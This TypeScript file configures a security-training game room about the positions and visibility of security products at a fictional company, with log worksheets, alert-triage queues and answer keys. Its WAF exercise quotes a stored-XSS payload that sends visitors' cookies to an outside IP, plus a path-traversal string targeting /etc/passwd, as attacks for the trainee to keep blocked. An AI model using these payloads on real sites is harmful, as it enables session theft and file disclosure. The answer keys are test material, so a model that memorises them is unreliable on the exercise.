import type { RoomExperience } from "./types";

// "Operation Line of Sight" for the "security-products-behaviour" room.
// Script: docs/campaign/19-security-products-behaviour.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Calloway Group (fictional). Lab data differs from the graded tasks: the
// coverage sort leaves out hypervisors (q1); the vSphere sheet asks about the
// sequence of events, not what host products could catch; no lab shows a
// Suricata alert.action pair (q2); the WAF queue is about false positives, never
// an oversized body (la1, f1); the email sheet is about authentication results,
// not a scanner alert (ac1); the cloud-signals queue never shows a notify-only
// DLP channel (q4) or a SIEM gap (q3); and nothing orders the attack (o1) or
// matches products to their unique view (m1).
export const SECURITY_PRODUCTS_BEHAVIOUR: RoomExperience = {
  roomId: "security-products-behaviour",
  codename: "Operation Line of Sight",
  theme: "sensors",
  handler: { name: "Theo Brandt", role: "Security Architect, Calloway Group" },
  briefing: [
    "Calloway Group. Fourteen security products, one SIEM, and a SOC that keeps asking 'why didn't anything alert?'",
    "Theo Brandt designed the stack. His answer is always the same question back: was anything positioned to see it?",
    "Every product sits somewhere: on a host, on the wire, beside it, in front of one app, in the cloud. That spot decides what it sees and what it can stop.",
    "Walk the stack layer by layer, and learn each product's line of sight.",
  ],
  mission: "Map every product to its position: tell what can block from what can only report, find which devices have no agent, read a hypervisor's own audit trail, see what a firewall knows about encrypted traffic, tune WAF false positives, read mail authentication results, and triage identity, DLP and NDR signals.",
  estimate: "~65 min",
  look: { primary: "#fbbf24", secondary: "#38bdf8", warn: "#f43f5e" },
  scene: "sightlines",
  layout: "stage",
  story: {
    intro: { title: "Was Anything Positioned to See It?", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/security-products-behaviour/lineofsight-intro-e4e3a488.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/security-products-behaviour/lineofsight-intro-57e2f30f.jpg" },
    afterStation: {
      host: { title: "Below the Agents", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/security-products-behaviour/lineofsight-ch2-95fe4cc2.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/security-products-behaviour/lineofsight-ch2-63d971e1.jpg" },
      app: { title: "Inline, Beside, In Front", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/security-products-behaviour/lineofsight-ch3-cffce127.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/security-products-behaviour/lineofsight-ch3-1c877eab.jpg" },
      signals: { title: "Only What Reaches It", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/security-products-behaviour/lineofsight-finale-4939ad85.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/security-products-behaviour/lineofsight-finale-904df147.jpg" },
    },
  },
  stations: [
    {
      id: "surface",
      label: "Where It Sits",
      topic: "Detection surface · inline vs out-of-band · policy decides what a product does",
      tagline: "Sort the stack into what can stop an attack and what can only report it",
      building: "control",
      taskIds: ["secprod-r1"],
    },
    {
      id: "host",
      label: "On the Host",
      topic: "AV vs EDR/XDR · coverage gaps · vCenter and ESXi audit logs",
      tagline: "Find the devices no agent sees, then read the hypervisor's own log",
      building: "vault",
      taskIds: ["secprod-r2", "secprod-q1", "secprod-r2b"],
    },
    {
      id: "wire",
      label: "On the Wire",
      topic: "NGFW, App-ID and TLS · IDS vs IPS placement",
      tagline: "See what a firewall really knows about an encrypted session",
      building: "factory",
      taskIds: ["secprod-r3", "secprod-r4", "secprod-q2"],
    },
    {
      id: "app",
      label: "In Front of the App",
      topic: "WAF placement, rule groups and their false positives",
      tagline: "Tune a WAF without letting attacks through",
      building: "lab",
      taskIds: ["secprod-r5", "secprod-la1", "secprod-f1"],
    },
    {
      id: "users",
      label: "What Users Touch",
      topic: "Secure web and email gateways · vulnerability scanners as probers",
      tagline: "Read mail authentication the way the gateway does",
      building: "office",
      taskIds: ["secprod-r6", "secprod-r6b", "secprod-ac1"],
    },
    {
      id: "signals",
      label: "Signals and Sinks",
      topic: "NDR, DLP, identity protection and CASB · SIEM and SOAR see only what reaches them",
      tagline: "Triage cloud and network signals, then map the whole stack",
      building: "ticket",
      taskIds: ["secprod-r7", "secprod-r8", "secprod-q3", "secprod-q4", "secprod-m1", "secprod-o1"],
      boss: true,
    },
  ],
  personas: {
    "secprod-q1": { name: "Theo Brandt", role: "Security Architect", line: "Ninety-six VMs encrypted on a hypervisor. What could our host products have seen?" },
    "secprod-q2": { name: "Theo Brandt", role: "Security Architect", line: "Same signature, two segments, one blocked and one not. Why?" },
    "secprod-q3": { name: "Theo Brandt", role: "Security Architect", line: "Three days of lateral movement and zero SIEM alerts. The junior says nothing happened." },
    "secprod-q4": { name: "Theo Brandt", role: "Security Architect", line: "DLP matched 2,000 records and the upload still finished. Explain." },
    "secprod-ac1": { name: "Theo Brandt", role: "Security Architect", line: "IDS caught a scanner User-Agent at 02:03 on Tuesday. Your verdict." },
  },
  briefings: {
    // ── Reading 1: detection surface ──
    "secprod-r1": [
      {
        kind: "sort",
        title: "Stop It, or Report It?",
        prompt: "Calloway's stack, as deployed today. For each, can it stop an attack in progress, or only tell you about it?",
        buckets: [
          { id: "stop", label: "Can stop it (inline, enforcing)" },
          { id: "report", label: "Can only report it" },
        ],
        items: [
          { id: "a", text: "NGFW at the internet edge, rules enforcing", bucket: "stop", why: "Every packet passes through it, and it is allowed to drop them." },
          { id: "b", text: "EDR on the finance file servers, policy set to Detect Only", bucket: "report", why: "Inline and able to block, but the policy says watch. Placement decides what it could do; policy decides what it does." },
          { id: "c", text: "NDR sensor on a TAP in the data centre", bucket: "report", why: "It reads a copy. The original packet is already delivered." },
          { id: "d", text: "WAF in front of the booking site, SQLi rules in BLOCK", bucket: "stop", why: "Inline in front of the app, enforcing." },
          { id: "e", text: "WAF rule just added in COUNT mode for tuning", bucket: "report", why: "Counting records the match and lets the request through." },
          { id: "f", text: "SIEM correlating everything", bucket: "report", why: "It sees only what is forwarded, after it happened." },
          { id: "g", text: "EDR on laptops, policy Prevent", bucket: "stop", why: "On the host, enforcing: it can kill the process." },
        ],
      },
    ],
    // ── Reading 2: AV and EDR coverage ──
    "secprod-r2": [
      {
        kind: "sort",
        title: "Is There an Agent?",
        prompt: "Devices from Calloway's inventory. Which ones can run an EDR agent, and which are invisible to it?",
        buckets: [
          { id: "yes", label: "EDR can run here" },
          { id: "no", label: "No EDR visibility" },
        ],
        items: [
          { id: "a", text: "Windows 11 laptop, company-managed", bucket: "yes", why: "The classic endpoint: agent installed by policy." },
          { id: "b", text: "Ubuntu web server in AWS", bucket: "yes", why: "Linux servers run EDR agents too." },
          { id: "c", text: "Core network switch", bucket: "no", why: "Network appliances run vendor firmware; no third-party agent." },
          { id: "d", text: "A contractor's personal phone on guest Wi-Fi", bucket: "no", why: "BYOD: no company software, so no agent." },
          { id: "e", text: "Domain controller", bucket: "yes", why: "A Windows server: agent installed and essential." },
          { id: "f", text: "Door badge reader in the lobby", bucket: "no", why: "Embedded IoT: nothing can be installed on it." },
          { id: "g", text: "PLC on the warehouse conveyor line", bucket: "no", why: "Operational technology: no agent, and often no logging at all." },
        ],
      },
    ],
    // ── Reading 2b: the hypervisor's own logs ──
    "secprod-r2b": [
      {
        kind: "worksheet",
        title: "Read the Hypervisor's Diary",
        prompt: "vCenter and ESXi audit events from one night, as the SIEM ingested them. No EDR could have logged any of these.",
        caption: "SIEM · index=vsphere · esxi-07.calloway.local · 2026-11-03",
        columns: ["time (UTC)", "event", "user", "detail"],
        rows: [
          ["22:41:10", "vsphere.event: PermissionAddedEvent", "svc-vcbackup", "role Administrator granted on Datacenter-LON to svc-vcbackup"],
          ["22:44:52", "esx.audit.ssh.enabled", "root", "SSH service started on esxi-07"],
          ["22:46:03", "esx.audit.ssh.session.opened", "root", "from 10.20.4.66"],
          ["22:47:30", "vim-cmd vmsvc/power.off (x 31)", "root", "31 VMs powered off in 70 seconds"],
          ["22:49:01", "(no further events)", "", ""],
        ],
        questions: [
          { id: "esc", q: "Which event shows privilege escalation in the management plane?", hint: "A role grant.", answer: ["PermissionAddedEvent"], why: "An account that backs up VMs suddenly holds Administrator on the whole datacenter." },
          { id: "ssh", q: "Which event deviates from ESXi's default state on its own?", hint: "A service that ships disabled.", answer: ["esx.audit.ssh.enabled", "ssh enabled", "ssh.enabled"], why: "SSH is off by default; turning it on is worth a look before you know anything else." },
          { id: "tech", q: "The mass power-off happens before any encryption. Which ATT&CK technique ID is it?", hint: "Service Stop.", answer: ["T1489"], why: "Running VMs hold their disks open; stopping them frees the files for the encryptor (T1486, next). This is your warning, minutes before impact." },
        ],
      },
    ],
    // ── Reading 3: NGFW and TLS ──
    "secprod-r3": [
      {
        kind: "worksheet",
        title: "What the Firewall Knew",
        prompt: "A PAN-OS traffic log for one HTTPS session from a sales laptop. TLS inspection is off for this category. Read what the firewall could and couldn't see.",
        caption: "PAN-OS · TRAFFIC log · end of session",
        columns: ["field", "value"],
        rows: [
          ["src / src_user", "10.30.12.44 / calloway\\l.marsh"],
          ["dst / dport", "203.0.113.90 / 443"],
          ["app", "ssl"],
          ["url_category", "file-sharing"],
          ["sni / url", "share.dropsite-transfer.example / (no path recorded)"],
          ["bytes_sent / bytes_received", "1,904,331,776 / 2,110,402"],
          ["decryption", "no-decrypt (policy: personal-privacy categories)"],
        ],
        questions: [
          { id: "user", q: "Which feature tied this session to a person, not just an IP?", hint: "src_user.", answer: ["User-ID", "user id", "userid"], why: "User-ID maps the IP to the signed-in user: l.marsh." },
          { id: "host", q: "Which hostname did the laptop connect to?", hint: "SNI travels in the clear.", answer: ["share.dropsite-transfer.example"], why: "The Server Name Indication is sent before encryption starts, so the firewall can read it." },
          { id: "path", q: "Can the firewall tell you which file or URL path was uploaded? (yes/no)", hint: "Look at the url field and the decryption setting.", answer: ["no"], why: "Without decryption, the path and the content stay inside TLS. What it does see: 1.9 GB went out. That's enough to escalate." },
        ],
      },
    ],
    // ── Reading 5: WAF ──
    "secprod-r5": [
      {
        kind: "queue",
        title: "Tune the WAF",
        prompt: "WAF blocks from the customer portal this week. Some stopped attacks; some stopped customers. Decide which rules stay as they are.",
        console: "WAF · blocked requests · portal.calloway.example",
        actions: [
          { id: "keep", label: "Correct block: keep the rule", tone: "escalate" },
          { id: "tune", label: "False positive: tune narrowly", tone: "close" },
        ],
        alerts: [
          { id: "support", time: "Mon 10:12", severity: "Medium", rule: "SQLi_BODY", entity: "POST /support/ticket",
            fields: [{ k: "matched text", v: "my report runs SELECT * FROM invoices and times out" }, { k: "client", v: "logged-in customer, 4-year account" }, { k: "field", v: "description" }],
            context: "A customer describing their own problem in a support form, including a SQL query.", answer: "tune", why: "Real text, not an attack. Exclude that one field on that one path from the SQLi rule; never switch the rule off." },
          { id: "xss", time: "Tue 03:40", severity: "High", rule: "CrossSiteScripting_BODY", entity: "POST /reviews",
            fields: [{ k: "matched text", v: "<img src=x onerror=fetch('//198.51.100.7/c?'+document.cookie)>" }, { k: "client", v: "new account, created 2 min earlier" }],
            context: "A product review containing script that would send readers' cookies to an outside address.", answer: "keep", why: "Stored XSS aimed at every visitor. The block is the WAF doing its job." },
          { id: "trav", time: "Wed 14:05", severity: "High", rule: "GenericLFI_URIPATH", entity: "GET /download",
            fields: [{ k: "matched text", v: "file=../../../../etc/passwd" }, { k: "client", v: "198.51.100.19, 400 requests in 1 min" }],
            context: "Path traversal attempts at machine speed.", answer: "keep", why: "Trying to read files outside the web root. Keep it, and look at what else that IP tried." },
          { id: "search", time: "Thu 11:30", severity: "Low", rule: "CrossSiteScripting_QUERYARGUMENTS", entity: "GET /search",
            fields: [{ k: "matched text", v: "q=<3 loyalty points" }, { k: "client", v: "mobile app, many users" }],
            context: "Customers typing a heart emoticon into the search box.", answer: "tune", why: "A '<' followed by a digit tripped a broad pattern. Tune it for this argument; real tags still get caught." },
        ],
      },
    ],
    // ── Reading 6: web and email gateways ──
    "secprod-r6": [
      {
        kind: "worksheet",
        title: "Read the Gateway's Verdicts",
        prompt: "Authentication results the email gateway stamped on three messages, as they appear in the headers.",
        caption: "Authentication-Results headers · mx.calloway.example",
        columns: ["msg", "From", "spf", "dkim", "dmarc", "path"],
        rows: [
          ["1", "invoices@calloway-supplies.example", "pass", "pass (d=calloway-supplies.example)", "pass", "inbound via gateway"],
          ["2", "ceo@calloway.example", "fail (198.51.100.44 not permitted)", "none", "fail (p=reject)", "inbound via gateway"],
          ["3", "it-helpdesk@calloway.example", "(not checked)", "(not checked)", "(not checked)", "internal: mailbox to mailbox, did not touch the gateway"],
        ],
        questions: [
          { id: "spoof", q: "Which message claims to be internal but was sent from a server our domain doesn't permit?", hint: "SPF fail on our own domain.", answer: ["2", "msg 2", "message 2"], why: "ceo@calloway.example from an unauthorised server, no signature, DMARC fail with p=reject: the gateway should reject it." },
          { id: "blind", q: "Which message did the gateway never see?", hint: "Look at the path column.", answer: ["3", "msg 3", "message 3"], why: "Internal-to-internal mail can stay on the mail platform. If that helpdesk mailbox is compromised, its phishing goes straight to colleagues." },
          { id: "proof", q: "Does msg 1's DMARC pass mean the attachment is safe? (yes/no)", hint: "What does DMARC prove?", answer: ["no"], why: "It proves the mail really came from that domain. A supplier with a compromised mailbox still passes. Content checks are separate." },
        ],
      },
    ],
    // ── Reading 7: NDR, DLP, identity ──
    "secprod-r7": [
      {
        kind: "queue",
        title: "Signals From Three Layers",
        prompt: "Alerts from NDR, DLP and identity protection. Each product has a classic look-alike for an attack. Separate them from the real one.",
        console: "SIEM · alerts from NDR, DLP, Entra ID Protection, CASB",
        actions: [
          { id: "esc", label: "Escalate", tone: "escalate" },
          { id: "close", label: "Close with reason", tone: "close" },
        ],
        alerts: [
          { id: "beacon", time: "01:00", severity: "Medium", rule: "NDR: periodic beaconing", entity: "BKP-02 > 10.30.0.40",
            fields: [{ k: "interval", v: "every 300 s" }, { k: "destination", v: "internal backup catalog server" }, { k: "process (EDR)", v: "VeeamAgent.exe, signed" }],
            context: "A regular heartbeat between two internal servers.", answer: "close", why: "NDR's classic look-alike: a backup agent polling its catalog on a timer. Signed process, internal destination." },
          { id: "travel", time: "07:12", severity: "High", rule: "Impossible travel", entity: "m.devlin",
            fields: [{ k: "sign-in 1", v: "London, 06:58" }, { k: "sign-in 2", v: "Frankfurt, 07:12" }, { k: "sign-in 2 IP", v: "Calloway VPN exit node" }],
            context: "Two sign-ins 14 minutes apart, 600 km apart.", answer: "close", why: "Identity protection's classic look-alike: the second sign-in came through our own VPN exit in Frankfurt." },
          { id: "oauth", time: "09:44", severity: "Medium", rule: "CASB: new OAuth app consent", entity: "j.huang",
            fields: [{ k: "app", v: "PDF Merge Online (unverified publisher)" }, { k: "scopes", v: "Mail.ReadWrite, Files.ReadWrite.All, offline_access" }, { k: "consented after", v: "clicking a link in an email" }],
            context: "A user granted an unknown app full read/write access to mail and files.", answer: "esc", why: "Consent phishing: the app now holds its own tokens, no password needed. Revoke the grant and review what it read." },
          { id: "payroll", time: "16:30", severity: "Medium", rule: "DLP: 2,400 national IDs in upload", entity: "payroll-svc > provider portal",
            fields: [{ k: "destination", v: "approved payroll provider (contract on file)" }, { k: "schedule", v: "every month, last working day" }],
            context: "The monthly payroll export.", answer: "close", why: "A benign true positive: DLP is right that it's sensitive data, and the approval is what makes it authorised." },
        ],
      },
    ],
  },
};
